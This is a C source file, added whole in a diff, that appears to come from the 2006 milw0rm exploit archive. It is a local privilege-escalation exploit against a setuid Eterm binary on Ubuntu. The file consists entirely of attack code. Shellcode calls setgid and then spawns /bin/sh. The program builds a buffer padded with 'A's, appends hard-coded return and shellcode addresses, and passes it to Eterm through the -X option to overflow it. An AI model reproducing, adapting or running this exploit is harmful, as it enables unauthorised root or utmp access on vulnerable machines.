@@ -1,0 +1,102 @@
+// eterm by default isn't setuid but there is a lot of instances where 
+// it needs setuid root/utmp to run different options. /str0ke
+
+/***************************************************************************
+ *   Copyright  ©Rosiello Security 2006                                    *
+ *                                                                         *
+ *   URL: http://www.rosiello.org                                          *
+ *   Author: Johnny Mast                                                   *
+ *   e-mail: rave@rosiello.org                                             *
+ *                                                                         *
+ *   This program is free software; you can redistribute it and/or modify  *
+ *   it under the terms of the GNU General Public License as published by  *
+ *   the Free Software Foundation; either version 2 of the License, or     *
+ *   (at your option) any later version.                                   *
+ *                                                                         *
+ *   This program is distributed in the hope that it will be useful,       *
+ *   but WITHOUT ANY WARRANTY; without even the implied warranty of        *
+ *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         *
+ *   GNU General Public License for more details.                          *
+ *                                                                         *
+ *   You should have received a copy of the GNU General Public License     *
+ *   along with this program; if not, write to the                         *
+ *   Free Software Foundation, Inc.,                                       *
+ *   59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.             *
+ ***************************************************************************/
+
+ //Exploit for Ubuntu with no randomized stack
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+char shellcode[] =
+/* Set gid */
+ "\x90\x90\x90\x90\x90\x90\x90"
+"\x31\xdb\x31\xc9\xbb\xff\xff\xff\xff\xb1\x2b\x31\xc0\xb0\x47\xcd\x80"
+"\x31\xdb\x31\xc9\xb3\x2b\xb1\x2b\x31\xc0\xb0\x47\xcd\x80"
+
+/* execve() */
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+
+unsigned long ret = 0xd096edb7;
+unsigned long shell = 0xbfffebfd;
+
+
+
+int main(void)
+{
+ char *first, *last, *ptr;
+ char  a[4], b[4];
+ int slen = strlen(shellcode);
+
+ if (!(first = (char *)malloc(4165)))
+  {
+   printf("%s:%d Could not allocate required memory\n", __FILE__, __LINE__);
+   exit(-1);
+  }
+
+
+ if (!(last = (char *)malloc(16)))
+  {
+   printf("%s:%d Could not allocate required memory\n", __FILE__, __LINE__);
+   exit(-1);
+  }
+
+  if (!(ptr = (char *)malloc(4183)))
+  {
+   printf("%s:%d Could not allocate required memory\n", __FILE__, __LINE__);
+   exit(-1);
+  }
+
+  strcpy(first, shellcode);
+  memset(first+slen, 'A', 4162-slen);
+  memset(last,  'A', 12);
+  first[4162] = '\0';
+  last[12] = '\0';
+
+  a[0] = (ret >> 24) & 0xff;
+  a[1] = (ret >> 16) & 0xff;
+  a[2] = (ret >> 8) & 0xff;
+  a[3] = (ret) & 0xff;
+
+
+  b[0] = (shell >> 24) & 0xff;
+  b[1] = (shell >> 16) & 0xff;
+  b[2] = (shell >> 8) & 0xff;
+  b[3] = (shell) & 0xff;
+
+  sprintf(ptr, "%s%c%c%c%c%s%c%c%c%c", first,a[0],a[1], a[2], a[3], last,
+  b[3],b[2],b[1],b[0]);
+
+
+
+  execl("/usr/bin/Eterm", "eterm", "-X", ptr, NULL);
+ return 0;
+}
+
+// milw0rm.com [2006-01-24]
